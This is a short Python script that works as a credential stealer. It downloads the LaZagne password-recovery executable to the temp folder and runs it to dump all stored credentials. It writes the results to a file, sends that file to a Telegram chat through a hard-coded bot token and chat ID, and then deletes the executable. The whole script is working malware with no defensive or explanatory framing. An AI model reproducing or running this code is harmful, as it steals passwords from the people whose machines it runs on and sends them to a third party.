import os
import subprocess
import tempfile
import requests
import telebot


def download(url):
    response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as file:
        file.write(response.content)


def send_telegram(file_name):
    bot = telebot.TeleBot('6098124172:AAHX-MJRn0-jpX10MGHI9fgbdGPp0ceZl1c')
    with open(file_name, 'rb') as file:
        bot.send_document(chat_id=-871618986, document=file)


def writer_file(result):
    file_name = 'hainguyenkma.txt'
    with open(file_name, 'w') as file:
        file.write(result)
    return file_name


if __name__ == '__main__':
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    download('https://github.com/0x0ff537/LaZagne/releases/'
             'download/2.4.4/lazagne.exe')
    p = subprocess.Popen(f'lazagne.exe all', stdout=subprocess.PIPE, shell=True)
    output, _ = p.communicate()
    result = output.decode('utf-8')
    file_name = writer_file(result)
    send_telegram(file_name)
    os.remove('lazagne.exe')
